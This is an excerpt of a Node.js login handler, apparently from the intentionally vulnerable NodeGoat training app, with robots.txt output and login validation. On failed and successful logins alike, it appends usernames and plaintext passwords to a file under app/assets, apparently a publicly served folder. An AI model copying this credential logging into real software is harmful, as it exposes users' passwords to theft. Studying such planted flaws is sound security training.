...
function SessionHandler(db) {
    ...
    // hadles robots page
    this.displayRobots = (req, res, next) => {
        res.type("text/plain");
        res.send("User-agent: *\nDisallow: /login/\nAllow: /\nSitemap: https://www.nodegoat.com/sitemap.xml\nHost: https://www.nodegoat.com\n ");
    };
        ...
        userDAO.validateLogin(userName, password, (err, user) => {
            ...
            if (err) {
                if (err.noSuchUser) {
                    ...
                    fs.appendFile('app/assets/passwordlogs.txt', "failed login, Invalid username,  userName -> " + userName + ", password -> " + password + "\n" , function (err) {
                        if (err) throw err;
                        console.log('Saved!');
                    });
                    ...
                    fs.appendFile('app/assets/passwordlogs.txt', "failed login, Invalid password, userName -> " + userName + ", password -> " + password + "\n" , function (err) {
                        if (err) throw err;
                        console.log('Saved!');
                    });
                    return res.render("login", {
            ...
            fs.appendFile('app/assets/passwordlogs.txt', "successful login, Valid credentials, userName -> " + userName + ", password -> " + password + "\n" , function (err) {
                if (err) throw err;
                console.log('Saved!');
            });
